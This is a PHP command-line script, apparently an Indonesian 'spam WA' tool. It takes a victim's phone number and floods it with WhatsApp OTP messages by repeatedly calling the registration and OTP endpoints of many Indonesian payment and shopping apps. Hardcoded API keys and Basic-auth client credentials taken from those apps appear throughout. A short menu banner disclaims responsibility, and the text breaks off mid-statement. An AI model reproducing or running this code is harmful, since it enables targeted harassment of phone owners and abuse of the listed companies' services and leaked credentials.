<?php

function color($color = "default" , $text  = null)
    {
        $arrayColor = array(
            'black_bg'   => '1;40',
            'red_bg'     => '1;41',
            'green_bg'   => '1;42',
            'yellow_bg'  => '1;43',
            'blue_bg'    => '1;44',
            'magenta_bg' => '1;45',
            'cyan_bg'    => '1;46',
            'white_bg'   => '1;47',
            'grey'       => '1;30',
            'red'        => '1;31',
            'green'      => '1;32',
            'yellow'     => '1;33',
            'blue'       => '1;34',
            'purple'     => '1;35',
            'nevy'       => '1;36',
            'white'      => '1;37',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
}

function clear() {
  //popen('cls', 'w');
  system('clear');
}
//

function fetch_value($str,$find_start,$find_end) {
  $start = @strpos($str,$find_start);
  if ($start === false) {
    return "";
  }
  $length = strlen($find_start);
  $end = strpos(substr($str,$start +$length),$find_end);
  return trim(substr($str,$start +$length,$end));
}

function imei($length = 36) {
    $characters = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function code($length = 10) {
    $characters = '1234567890';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function codex($length = 36) {
    $characters = '1234567890qwertyuioplkjhgfdsazxcvbnm';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function acak($length = 36) {
    $characters = '1234567890QWERTYUIOPLKJHGFDSAZXCVBNM';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function serpul($nomor,$url) {
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/phone-number',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"message":"','"');
if ($result == 'Nomor terdaftar') {
  goto otpserpul;
}
elseif ($result == 'Nomor Handphone tidak terdaftar') {
}
else{
  echo " SERPUL ".$url." ".$response."\n";
}
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/register',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"full_name":"ading","phone_number":"'.$nomor.'","referrer_code":"","pin":"121212","pin_confirmation":"121212"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
otpserpul:
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://'.$url.'-api.serpul.co.id/api/v2/auth/login',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"'.$nomor.'","pin":"121212","sender_id":"1"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','"}');
if ($result == 'Kode verifikasi berhasil dikirim') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SERPUL ".$url." ".$response."\n";
}}


$username = 'hanx-666'; // Nama pengguna GitHub
$repository = 'spam-wa'; // Nama repository
$branch = 'main'; // Branch atau tag yang ingin diunduh
$localFolder = __DIR__ ; // Folder tujuan
$versionFile = __DIR__ .'/version.txt'; // File versi lokal
$remoteVersionFile = "https://raw.githubusercontent.com/$username/$repository/$branch/version.txt"; // File versi di GitHub

// Fungsi untuk mendapatkan konten file dari URL
function fetchRemoteContent($url) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// Fungsi untuk mengunduh file
function downloadFile($fileURL, $localPath) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    $fileContent = file_get_contents($fileURL, false, $context);
    if ($fileContent === false) {
        echo color("red"," Error: Failed to download $fileURL\n");
        return false;
    }
    file_put_contents($localPath, $fileContent);
    //echo color("green"," Downloaded: $localPath\n");
    return true;
}

// Fungsi untuk memproses file dan folder dari GitHub
function fetchGitHubFiles($url) {
    $options = [
        "http" => [
            "header" => "User-Agent: PHP Script"
        ]
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
    return json_decode($response, true);
}

function processGitHubFiles($files, $localFolder) {
    foreach ($files as $file) {
        if ($file['type'] === 'file') {
            $filePath = $localFolder . '/' . $file['path'];
            $dirPath = dirname($filePath);
            if (!is_dir($dirPath)) {
                mkdir($dirPath, 0777, true);
            }
            downloadFile($file['download_url'], $filePath);
        } elseif ($file['type'] === 'dir') {
            $subFolderFiles = fetchGitHubFiles($file['_links']['self']);
            processGitHubFiles($subFolderFiles, $localFolder);
        }
    }
}
lagi:
clear();
echo color("green","⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
================================\n");

echo color("yellow"," WARNING ! ! !\n");

echo color("red"," DOSA DI TANGGUNG ANDA😹!
================================\n");

sleep(4);
clear();
echo color("green","⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏   ⢛⣫⣶⣿⣿
⣿⣿⣿ ⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶  ⢿⣿⡿⠿⢛
⣿⣿⡇   ⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀ ⢰⣾⣿⣿
⣿⣿⣷ ⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆ ⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋ ⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁   ⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏ ⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇ ⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘ ⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿ ⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉ ⠐ ⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧ ⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇ ⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷  ⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾ ⡌ ⠐⠘⣿⣿
⣿⣿⣿⣿⣿ ⡐⠈⠸⣏⡇ ⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸ ⢸⡂⠱ ⠇ ⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼ ⠐ ⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟ ⡿ ⢸ ⠃⠄ ⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇ ⡗⢸⢱ ⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗ ⣸⠱ ⡐⠆⠁⢢ ⠁⢸⣿
⣷⣦⡄ ⣜⠃ ⢠⠘⠆⠂⢇ ⠉ ⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖ ⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂ ⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆  ⠈  ⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄  ⢀⣴⣿\n");
echo color("red","====================\n");
echo color("red","Rizky.0_o\n");
echo color("red","====================\n");
echo color("green"," 1: Whatsapp[OTP]\n");
echo color("green"," 2: Komen teks\n");
echo color("yellow"," 3: Grup WhatsApp\n\n");
echo color("red","====================\n");
echo color("green"," Pilih : ");
$aaa1 = trim(fgets(STDIN));
if ($aaa1 == 1) {
  goto whatsapp;
}
if ($aaa1 == 2) {
  goto pesan;
}
if ($aaa1 == 3) {
  clear();
  $url = "https://chat.whatsapp.com/J58JyghbGTEDulAXrUlRyh";
  shell_exec("termux-open-url $url");
  echo color("green","???");
  exit();
}
else {
  echo color("red"," Pilihan Salah\n");
  sleep(2);
  goto lagi;
}

whatsapp:
clear();
echo shell_exec("cowsay -f eyes 'Code By HanX' | lolcat 2>&1");
echo color("green","\n\n\nEnter Phone Number (Using 08) : ");
//$nomor = '083850540570';
$nomor = trim(fgets(STDIN)); #08xxx
if ($nomor == '-') {
  echo color("red"," Maksud lu apa mau nge spam gw?\n");
  sleep(5);
  goto lagi;
}
$nomor2 = ltrim($nomor, '0'); #8xxx


//CANDIRELOAD
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"uuid":"b787045b140c631f","phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json',
    'irsauth:  c6738e934fd7ed1db55322e423d81a66'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " CANDIRELOAD ".$response."\n";
}


//BISATOPUP
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id='.codex(16).'&version_name=6.12.04&version=61204',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'phone_number='.$nomor,
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/x-www-form-urlencoded'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','","');
if ($result == 'OTP akan segera dikirim ke perangkat') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " BISATOPUP ".$response."\n";
}



//SPEEDCASH
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/oauth/token',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'grant_type=client_credentials',
  CURLOPT_HTTPHEADER => array(
    'Authorization:  Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
    'Content-Type:  application/x-www-form-urlencoded'
  ),
));
$response = curl_exec($curl);
//echo $response;
$auth = fetch_value($response,'access_token":"','","');
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"version_name":"6.2.1 (428)","phone":"'.$nomor.'","appid":"SPEEDCASH","version_code":428,"location":"0,0","state":"REGISTER","type":"WA","app_id":"SPEEDCASH","uuid":"00000000-4c22-250d-ffff-ffff'.codex(8).'","via":"BB ANDROID"}',
  CURLOPT_HTTPHEADER => array(
    'Authorization:  Bearer '.$auth,
    'Content-Type: application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"rc":"','","');
if ($result == '00') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " SPEEDCASH ".$response."\n";
}



//KERBEL
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://keranjangbelanja.co.id/api/v1/user/otp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'----dio-boundary-0879576676
content-disposition: form-data; name="phone"

'.$nomor.'
----dio-boundary-0879576676
content-disposition: form-data; name="otp"

118872
----dio-boundary-0879576676--',
  CURLOPT_HTTPHEADER => array(
    'content-type:  multipart/form-data; boundary=--dio-boundary-0879576676'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"result":"','","');
if ($result == 'OTP Berhasil Dikirimkan') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " KERBEL ".$response."\n";
}



//TITIPKU
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://titipku.tech/v1/mobile/auth/otp?method=wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_number":"+62'.$nomor2.'","message_placeholder":"hehe"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json; charset=UTF-8'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"message":"','","');
if ($result == 'otp sent') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " TITIPKU ".$response."\n";
}




//BELANJAPARTS
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'","type":"register"}',
  CURLOPT_HTTPHEADER => array(
    'content-type:  application/json',
    'authorization:  Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'stat_msg":"','"}');
if ($result == 'Successfully validated otp') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " BELANJAPARTS ".$response."\n";
}




//TV VOUCHER
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.tv-voucher.com/tvv/app/general/v2/checkdatawa',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"countryid":"62","phone":"'.$nomor.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=UTF-8',
    'TVV-APIKEY:  Tvv1c8cb860b53a53451161937dff2fb5b9c2424c06b3b2dda97c02096a7f6c2'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"success":',',"');
if ($result == 'true') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " TV VOUCHER ".$response."\n";
}



//JOGJAKITA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://aci-user.bmsecure.id/oauth/token',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1',
  CURLOPT_HTTPHEADER => array(
    'authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==',
    'Content-Type:  application/x-www-form-urlencoded',
    'User-Agent: okhttp/4.10.0'
  ),
));
$response = curl_exec($curl);
//echo $response;
$auth = fetch_value($response,'{"access_token":"','","');
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone_user":"'.$nomor.'","primary_credential":{"device_id":"","fcm_token":"","id_kota":0,"id_user":0,"location":"0.0,0.0","uuid":"","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"},"uuid":"00000000-4c22-250d-3006-9a465f072739","version_code":"501","version_name":"6.10.1","via":"jogjakita_user"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json; charset=UTF-8',
    'Authorization: Bearer '.$auth
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"rc":',',"');
if ($result == '200') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " JOGJAKITA ".$response."\n";
}


//ANEKAPULSA
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://anekapulsa-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ANEKAPULSA ".$response."\n";
}

//GORELOAD
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://goreload-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " GORELOAD ".$response."\n";
}


//ASTRONOT
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://astronot-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ASTRONOT ".$response."\n";
}



//PULSACL
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://amc-smart.smartserver.id/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " PULSACL ".$response."\n";
}



//ONOY
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://5.104.82.144:9858/auth/verify/phone',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'{"','":"');
if ($result == 'verification_id') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
}
else{
  echo " ONOY ".$response."\n";
}



//PULSAPINTAR
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.cl2406v3.berkah-ts.my.id/apps/users/registerotp',
  CURLOPT_RETURNTRANSFER => true,
CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS =>'{"name":"AGUS","pin":"111111","phone":"'.$nomor.'","kodereferal":null,"kota":"Banda Aceh","email":"AGUS'.code(5).'@gmail.com","otpType":"wa","uuid":"b787045b140c631f"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type:  application/json',
    'irsauth:  f567ce1acd17b852dae4d975aedb16fe'
  ),
));
$response = curl_exec($curl);
//echo $response;
$stts = fetch_value($response,'{"success":',',"');
if ($stts == 'true') {
  echo color
